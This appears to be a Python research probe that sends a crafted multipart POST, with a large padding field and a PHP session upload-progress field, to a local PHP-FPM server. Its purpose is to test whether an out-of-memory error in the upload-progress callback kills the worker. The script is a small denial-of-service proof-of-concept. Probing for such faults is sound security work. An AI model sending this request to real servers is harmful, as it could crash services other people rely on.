#!/usr/bin/env python3
"""Probe: does a pre-RINIT OOM inside the upload-progress session callback
kill the FPM worker or leave it alive?"""
import http.client
import sys
import time

port = 18120
sid = "f2sprem0000000000000000000001"
pad = int(sys.argv[1]) if len(sys.argv) > 1 else 12 * 1024 * 1024
B = b"----f2sprem00000000"


def part(name, val, fn=None):
    h = b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
    if fn is not None:
        h += b"; filename=\"" + fn + b"\""
    h += b"\r\n\r\n"
    return h + val + b"\r\n"


body = part(b"pad", b"Q" * pad)
body += part(b"PHPSESSID", sid.encode())
body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"fk1")
body += part(b"f", b"", b"a")
body += b"--" + B + b"--\r\n"
print("body", len(body), "pad", pad)

c = http.client.HTTPConnection("127.0.0.1", port, timeout=180)
try:
    c.request("POST", "/index.php", body=body, headers={
        "Content-Type": b"multipart/form-data; boundary=" + B,
        "Content-Length": str(len(body)),
        "Cookie": "PHPSESSID=" + sid,
    })
    r = c.getresponse()
    print("status", r.status, r.read(200)[:120])
except Exception as e:
    print("ERR", e)
finally:
    c.close()
